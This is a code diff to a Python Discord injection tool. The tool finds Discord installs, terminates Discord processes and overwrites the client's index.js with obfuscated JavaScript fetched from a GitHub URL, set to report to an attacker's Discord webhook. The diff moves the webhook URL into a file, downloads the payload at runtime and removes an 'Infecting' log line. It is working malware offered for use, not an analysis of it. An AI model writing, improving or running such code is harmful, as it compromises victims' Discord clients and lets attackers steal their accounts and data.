@@ -4,10 +4,10 @@ import re
 from base64 import b64encode
 
 import psutil as psutil
+import requests
 
 appData = os.getenv("localappdata")
-webhook = "https://discord.com/api/webhooks/1148402961844809738/J4Fiq6OAg" \
-          "-t5dVeKHv_FxLhh05qt2Llg7QXRBUQlKQpso4KJsmw5jqjto7PbvLLeVrz_"
+webhook = open("webhook", "r").read()
 
 base = """function decrypt(chain) {
     let script = chain
@@ -68,7 +68,7 @@ class Injection:
             f"{appData}\\Discord"
         ]
 
-        self.code = open("inject.js", "r", encoding="utf-8").read()
+        self.code = requests.get("https://raw.githubusercontent.com/XoQ2988/LuvdU/master/inject.js").text
 
         for proc in psutil.process_iter():
             if "discord" in proc.name().lower():
@@ -79,12 +79,8 @@ class Injection:
                 continue
 
             if self.getCore(d) is not None:
-                print(f"Infecting {d}")
                 with open(f"{self.getCore(d)[0]}\\index.js", "w", encoding="utf-8") as f:
-                    f.write(hideJS(
-                        self.code
-                        .replace("%WEBHOOK%", webhook)
-                    ))
+                    f.write(hideJS(self.code.replace("%WEBHOOK%", webhook)))
 
 
     @staticmethod
